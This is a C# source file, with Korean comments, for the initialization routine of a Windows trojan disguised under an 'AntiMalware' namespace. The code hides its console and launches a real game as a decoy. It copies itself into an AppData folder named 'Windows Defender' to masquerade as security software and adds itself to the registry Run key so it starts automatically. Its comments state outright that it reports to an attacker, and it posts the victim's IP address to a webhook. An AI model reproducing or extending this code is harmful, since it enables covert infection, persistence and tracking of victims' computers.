using Microsoft.Win32;
using Newtonsoft.Json;
using System.Runtime.InteropServices;
using System.Text;
// 프로그램을 실행시 초기화에 관한 함수
// make by root1234567891234 as sillo
// 주석 지우지 마세요

namespace AntiMalware
{
    internal class init
    {
        private value value = new value();
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
        // 초기화 함수
        public void Init() 
        {
            // 콘솔화면을 없앤다.
            ShowWindow(GetConsoleWindow(), 0);
            // 실제게임을 실행한다.
            try
            {
                FileInfo file_ = new FileInfo(value.path);
                if (file_.Exists)
                {
                    ShellExecute(IntPtr.Zero, "open", Directory.GetCurrentDirectory() + value.path, "", "", 1);
                }
            }
            catch { }
            // 본 프로그램을 ..\AppData\Roaming\Windows Defender 위치로 이동시켜 컴퓨터 시작시 프로그램이 실행되게한다. 그리고 레지스트리에 본프로그램을 autostart프로그램으로 등록한다.
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + "Windows Defender";
                DirectoryInfo path_ = new DirectoryInfo(path);
                if (!path_.Exists)
                {
                    path_.Create();
                    System.IO.File.Copy(Environment.CurrentDirectory + "\\" + value.filename, path + "\\" + value.filename, true);
                    RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rkApp.SetValue(value.filename , path + "\\" + value.filename);
                    System.IO.File.Copy(Environment.CurrentDirectory + "\\" + "OpenCvSharpExtern.dll", path + "\\" + "OpenCvSharpExtern.dll", true);
                }
            } 
            catch { }
            // 본 프로그램이 이미 실행중일경우 후에 실행된 프로그램을 종료시킨다.
            System.Diagnostics.Process[] processes = null;
            string scp = System.Diagnostics.Process.GetCurrentProcess().ProcessName.ToUpper();
            processes = System.Diagnostics.Process.GetProcessesByName(scp);
            if (processes.Length > 1) { Environment.Exit(0); }
            // 본 프로그램을 실행했을경우 실행했음을 공격자에게 알림
            var SuccessWebHook = new
            {
                username = value.ip + value.version,
                content = "injected"
            };
            StringContent content = new StringContent(JsonConvert.SerializeObject(SuccessWebHook), Encoding.UTF8, "application/json");
            value.client_.PostAsync(value.EndPoint, content).Wait();
        }
    }
}
